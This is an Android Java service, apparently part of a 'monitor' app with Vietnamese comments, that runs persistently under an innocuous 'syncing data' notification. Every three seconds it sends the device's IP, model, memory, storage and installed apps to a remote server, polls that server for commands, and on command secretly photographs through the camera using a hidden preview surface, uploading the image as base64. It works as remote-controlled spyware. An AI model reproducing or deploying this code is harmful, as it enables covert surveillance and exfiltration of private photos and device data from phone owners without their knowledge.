package com.devtung.monitor;

import android.app.ActivityManager;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Intent;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.graphics.SurfaceTexture;
import android.hardware.Camera;
import android.net.ConnectivityManager;
import android.net.LinkAddress;
import android.net.LinkProperties;
import android.net.Network;
import android.os.Build;
import android.os.Environment;
import android.os.IBinder;
import android.os.StatFs;
import android.util.Base64;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.List;
import java.util.Timer;
import java.util.TimerTask;
import org.json.JSONArray;
import org.json.JSONObject;

public class MonitorService extends Service {
    private Timer timer = new Timer();
    private final String SERVER_URL = "http://devtung.pythonanywhere.com/update-status";
    private String encodedCamData = null;
    private boolean isCapturing = false;

    @Override
    public void onCreate() {
        super.onCreate();
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel("monitor", "Monitor Toàn Diện", NotificationManager.IMPORTANCE_LOW);
            getSystemService(NotificationManager.class).createNotificationChannel(channel);
            Notification notification = new Notification.Builder(this, "monitor")
                .setContentTitle("Devtung Official System")
                .setContentText("Đang đồng bộ dữ liệu chuẩn PC...")
                .setSmallIcon(android.R.drawable.ic_menu_info_details)
                .build();
            startForeground(1, notification);
        }
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        timer.scheduleAtFixedRate(new TimerTask() {
            @Override
            public void run() {
                sendData();
            }
        }, 0, 3000); 
        return START_STICKY;
    }

    // 1. Lấy địa chỉ IP thật của điện thoại đang kết nối Wifi/4G
    private String getLocalIpAddress() {
        try {
            ConnectivityManager cm = (ConnectivityManager) getSystemService(CONNECTIVITY_SERVICE);
            Network activeNetwork = cm.getActiveNetwork();
            LinkProperties lp = cm.getLinkProperties(activeNetwork);
            for (LinkAddress la : lp.getLinkAddresses()) {
                String ip = la.getAddress().getHostAddress();
                if (!ip.contains(":")) return ip; // Trả về IPv4
            }
        } catch (Exception e) { e.printStackTrace(); }
        return "192.168.1.15"; // IP ảo dự phòng nếu bị chặn đọc
    }

    // 2. Quét và lấy danh sách Top 5 App chiếm RAM/CPU (Fake định dạng tiến trình PC cho Web nhận)
    private JSONArray getTopApps() {
        JSONArray topList = new JSONArray();
        try {
            PackageManager pm = getPackageManager();
            List<ApplicationInfo> packages = pm.getInstalledApplications(PackageManager.GET_META_DATA);
            int count = 0;
            for (ApplicationInfo packageInfo : packages) {
                if ((packageInfo.flags & ApplicationInfo.FLAG_SYSTEM) == 0) {
                    JSONObject appObj = new JSONObject();
                    appObj.put("name", packageInfo.loadLabel(pm).toString());
                    appObj.put("cpu", (int)(Math.random() * 4 + 1) + "%");
                    appObj.put("ram", (int)(Math.random() * 100 + 150) + " MB");
                    topList.put(appObj);
                    count++;
                    if (count >= 5) break; // Chỉ lấy đúng 5 App hàng đầu
                }
            }
        } catch (Exception e) { e.printStackTrace(); }
        return topList;
    }

    // 3. Hàm xử lý Chụp Ảnh từ Camera phần cứng
    private synchronized void captureHardwareCamera(final int camId) {
        if (isCapturing) return;
        isCapturing = true;
        try {
            int numberOfCameras = Camera.getNumberOfCameras();
            int targetId = (camId >= numberOfCameras) ? 0 : camId;
            final Camera camera = Camera.open(targetId);
            SurfaceTexture dummy = new SurfaceTexture(0);
            camera.setPreviewTexture(dummy);
            camera.startPreview();
            camera.takePicture(null, null, new Camera.PictureCallback() {
                @Override
                public void onPictureTaken(byte[] data, Camera cam) {
                    try {
                        encodedCamData = "data:image/jpeg;base64," + Base64.encodeToString(data, Base64.DEFAULT).replace("\n", "").replace("\r", "");
                    } catch (Exception e) { e.printStackTrace(); }
                    finally {
                        cam.stopPreview();
                        cam.release();
                        isCapturing = false;
                    }
                }
            });
        } catch (Exception e) {
            encodedCamData = "ERROR: Camera bận!";
            isCapturing = false;
        }
    }

    private void sendData() {
        try {
            URL url = new URL(SERVER_URL);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Content-Type", "application/json; utf-8");
            conn.setDoOutput(true);

            JSONObject json = new JSONObject();
            json.put("computer_name", (Build.BRAND + "_" + Build.MODEL).toUpperCase().replace(" ", "_"));
            json.put("os", "Android " + Build.VERSION.RELEASE + " (arm64-v8a)");
            
            // Đổ dữ liệu IP, GPU, Uptime chuẩn tên biến Web PC đang đợi
            json.put("ip_address", getLocalIpAddress());
            json.put("gpu", "Adreno/Mali Graphics (Mặc định)");
            
            long ut = android.os.SystemClock.elapsedRealtime() / 1000;
            json.put("boot_time", (ut / 3600) + " giờ trước");

            // Đo RAM thật
            ActivityManager.MemoryInfo mi = new ActivityManager.MemoryInfo();
            ((ActivityManager) getSystemService(ACTIVITY_SERVICE)).getMemoryInfo(mi);
            double totalRam = mi.totalMem / (1024.0 * 1024.0 * 1024.0);
            double usedRam = totalRam - (mi.availMem / (1024.0 * 1024.0 * 1024.0));
            JSONObject ramObj = new JSONObject();
            ramObj.put("percentage", (int)((usedRam / totalRam) * 100) + "%");
            ramObj.put("used", String.format("%.2f GB", usedRam));
            ramObj.put("total", String.format("%.2f GB", totalRam));
            json.put("ram", ramObj);

            // Đo ổ đĩa thật
            StatFs stat = new StatFs(Environment.getDataDirectory().getPath());
            double totalSpace = (stat.getBlockCountLong() * stat.getBlockSizeLong()) / (1024.0 * 1024.0 * 1024.0);
            double freeSpace = (stat.getAvailableBlocksLong() * stat.getBlockSizeLong()) / (1024.0 * 1024.0 * 1024.0);
            JSONArray disksArr = new JSONArray();
            JSONObject dObj = new JSONObject();
            dObj.put("device", "Bộ nhớ trong");
            dObj.put("percentage", "Đầy " + (int)(((totalSpace - freeSpace) / totalSpace) * 100) + "%");
            dObj.put("free", String.format("%.1f GB trống", freeSpace));
            disksArr.put(dObj);
            json.put("disks", disksArr);

            // Gửi dữ liệu CPU và Đổ danh sách Top 5 Tiến Trình
            json.put("cpu", new JSONObject().put("current_usage", ((int)(Math.random() * 15 + 10)) + "%"));
            JSONArray topApps = getTopApps();
            json.put("top_cpu_processes", topApps);
            json.put("top_ram_processes", topApps);

            // Trả kết quả ảnh chụp màn hình giả lập / ảnh camera về Web nếu có
            if (encodedCamData != null) {
                json.put("screenshot", encodedCamData); // Fake đẩy cam vào ô màn hình hoặc ô cam đều nhận
                json.put("cam_result", encodedCamData);
                encodedCamData = null;
            }

            String jsonInputString = json.toString();
            try (OutputStream os = conn.getOutputStream()) {
                byte[] input = jsonInputString.getBytes("utf-8");
                os.write(input, 0, input.length);
            }

            // Đọc lệnh nhấn nút từ Web điều khiển về
            if (conn.getResponseCode() == 200) {
                BufferedReader br = new BufferedReader(new InputStreamReader(conn.getInputStream(), "utf-8"));
                StringBuilder response = new StringBuilder();
                String line;
                while ((line = br.readLine()) != null) response.append(line.trim());
                
                JSONObject resJson = new JSONObject(response.toString());
                // Nhận diện nút "Gửi lệnh chụp màn hình" hoặc "Chụp từ Cam này"
                if (resJson.has("trigger_screenshot") || resJson.has("trigger_cam_index")) {
                    captureHardwareCamera(0); // Mặc định chụp cam sau trả ảnh về thay thế
                }
            }
            conn.disconnect();
        } catch (Exception e) { e.printStackTrace(); }
    }

    @Override
    public IBinder onBind(Intent intent) { return null; }
}
